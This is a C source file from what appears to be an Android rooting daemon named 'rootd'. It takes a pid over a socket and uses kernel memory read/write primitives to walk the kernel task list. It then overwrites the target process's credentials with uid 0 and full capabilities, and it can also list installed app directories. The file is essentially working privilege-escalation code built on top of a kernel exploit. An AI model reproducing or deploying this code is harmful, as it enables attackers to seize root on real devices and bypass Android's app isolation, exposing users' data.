#include <errno.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "client.h"
#include "logging.h"
#include "kernel_rw.h"
#include "kernel_structs.h"

const char *command_names[] = {
    #define CFG(x) [CMD_##x] = #x, 
    #include "client_commands.def"
    #undef CFG
};

static void list_apps(int sock)
{
    DIR *dir;
    struct dirent *entry;
    int appcount = 0;
    size_t app_name_len = 0;

    ALOGD("rootd", "Executing list_apps");
    dir = opendir("/data/data");
    if (NULL == dir) {
        /* Handle an error, maybe return an empty dir list */
        ALOGE("rootd", "Failed to open dir: %s", strerror(errno));
        appcount = 0;
        send(sock, &appcount, sizeof(appcount), 0);
        return;
    }
    appcount = 0;
    while ((entry = readdir(dir))) {
        ++appcount;
    }
    closedir(dir);
    /* Send a response declaring the number of expected entries */
    ALOGD("rootd", "Total apps: %d", appcount);
    appcount = htonl(appcount);
    send(sock, &appcount, sizeof(appcount), 0);
    /* Now again, I know, it's an ugly hack, but I don't want to keep track of
     * all the entries dynamically as it forces me to allocate memory and I
     * don't want to */

    dir = opendir("/data/data");
    if (NULL == dir) {
        /* Handle an error, maybe return an empty dir list */
    }
    while ((entry = readdir(dir))) {
        ALOGD("rootd", "Sending app name: %s", entry->d_name);
        app_name_len = htonl(strlen(entry->d_name));
        send(sock, &app_name_len, sizeof(app_name_len), 0);
        send(sock, entry->d_name, strlen(entry->d_name), 0);
    }
    closedir(dir);
}

struct task_struct *find_task_dfs(struct task_struct *parent, pid_t pid)
{
    struct task_struct *iter = NULL;
    struct task_struct *result = NULL;
    struct task_struct current;
    struct list_head *pos = NULL;
    struct list_head *head = NULL;
    /* Since I can't dereference pointers in the kernel, I need to read structs
     * into an intermediate local struct (temp), and access the memebers from
     * there */
    struct list_head temp;

    read_kern(parent, &current, sizeof(current));
    if (current.pid == pid) {
        return parent;
    }

    /* Loop over all the task's children and */
    head = &parent->children;

    /* pos = head->next */
    read_kern(head, &temp, sizeof(temp));
    pos = temp.next;

    while (pos != head) {
        iter = list_entry(pos, struct task_struct, sibling);

        read_kern(iter, &current, sizeof(current));
        ALOGD("rootd", "Read child with pid %d at %p", current.pid, iter);

        /* DFS descend */
        result = find_task_dfs(iter, pid);
        if (result != NULL) {
            return result;
        }

        /* pos = pos->next */
        read_kern(pos, &temp, sizeof(temp));
        pos = temp.next;
    }

    return NULL;
}

struct task_struct *find_init(struct thread_info *k_thread_info)
{
    struct thread_info tinfo;
    struct task_struct current;
    struct task_struct *iter;

    read_kern(k_thread_info, &tinfo, sizeof(tinfo));
    ALOGD("rootd", "Read thread_info");
    iter = tinfo.task;
    ALOGD("rootd", "task_struct root at %p", iter);

    while (1) {
        read_kern(iter, &current, sizeof(current));

        ALOGD("rootd", "Task with pid %d at %p", current.pid, iter);
        ALOGD("rootd", "parent at %p", current.real_parent);

        if (current.pid == 1) {
            break;
        }

        iter = current.real_parent;
    }

    return iter;
}

void root_process(struct task_struct *task)
{
    struct task_struct *iter = NULL, *leader = NULL;
    struct task_struct current;
    struct cred credentials;

    iter = leader = task;
    do {
        read_kern(iter, &current, sizeof(current));

        /* cred */
        ALOGD("rootd", "Reading cred struct of task @%p with pid %d",
                iter, current.pid);

        read_kern((void *)current.cred, &credentials, sizeof(credentials));

        ALOGD("rootd", "Modifying cred info to uid 0");

        credentials.uid = 0;
        credentials.gid = 0;
        credentials.suid = 0;
        credentials.sgid = 0;
        credentials.euid = 0;
        credentials.egid = 0;
        credentials.fsuid = 0;
        credentials.fsgid = 0;

        credentials.cap_inheritable.cap[0] = 0xffffffff;
        credentials.cap_inheritable.cap[1] = 0xffffffff;
        credentials.cap_permitted.cap[0] = 0xffffffff;
        credentials.cap_permitted.cap[1] = 0xffffffff;
        credentials.cap_effective.cap[0] = 0xffffffff;
        credentials.cap_effective.cap[1] = 0xffffffff;
        credentials.cap_bset.cap[0] = 0xffffffff;
        credentials.cap_bset.cap[1] = 0xffffffff;

        ALOGD("rootd", "Writing modified cred to task_struct");
        /* Just copy the credential info, don't do anything to the "usage" of
         * the cred structure */
        write_kern((void *)&current.cred->uid, &credentials.uid,
                sizeof(credentials) - sizeof(credentials.usage));

        iter = list_entry(current.thread_group.next, struct task_struct,
                thread_group);
    } while (iter != leader);
}

void handle_client(int sock, struct thread_info *k_thread_info)
{
    struct thread_info tinfo;
    ssize_t received = 0, sent = 0;
    struct task_struct *task_init = NULL;
    struct task_struct *task_for_pid = NULL;
    pid_t pid = -1;
    int result;

    received = recv(sock, &pid, sizeof(pid), 0);
    if (received < 0) {
        ALOGE("rootd", "recv error: %s", strerror(errno));
        return;
    }
    pid = ntohl(pid);
    if (pid < 0) {
        ALOGE("rootd", "Illegal pid %d", pid);
        return;
    }
    ALOGD("rootd", "Starting search for the task_struct with pid %d", pid);
    task_init = find_init(k_thread_info);
    ALOGD("rootd", "Found init at %p", task_init);

    task_for_pid = find_task_dfs(task_init, pid);

    if (task_for_pid != NULL) {
        ALOGD("rootd", "Found task struct for pid %d at %p", pid, task_for_pid);
        root_process(task_for_pid);
        result = 0;
    } else {
        ALOGE("rootd", "Failed to find task struct for pid %d", pid);
        result = -1;
    }
    result = htonl(result);
    sent = send(sock, &result, sizeof(result), 0);
    if (sent < 0) {
        ALOGE("rootd", "send error: %s", strerror(errno));
    }
}

void client_message_loop(int sock)
{
    ssize_t received;
    struct client_command_header header = {0};
    enum command_code cmd;
    while (1) {
        ALOGD("rootd", "Waiting for a command");
        /* read command */
        received = recv(sock, &header, sizeof(header), 0);
        if (received < 0) {
            ALOGE("rootd", "Recv error: %s", strerror(errno));
            break;
        }
        if (received < sizeof(header)) {
            ALOGE("rootd", "Received less than expected");
            continue;
        }
        cmd = ntohl(header.cmd);
        if (cmd >= CMD_MAX_CMD) {
            ALOGE("rootd", "Received illagal command code %d", cmd);
            continue;
        }
        ALOGD("rootd", "Received command %s(%d)", command_names[cmd], cmd);
        switch (cmd) {
            case CMD_APP_LIST:
                list_apps(sock);
                break;
            case CMD_ROOT_ME:
                break;
            case CMD_NOP:
                break;
            default:
                ALOGE("rootd", "Unknown command");
                break;
        }
    }
}
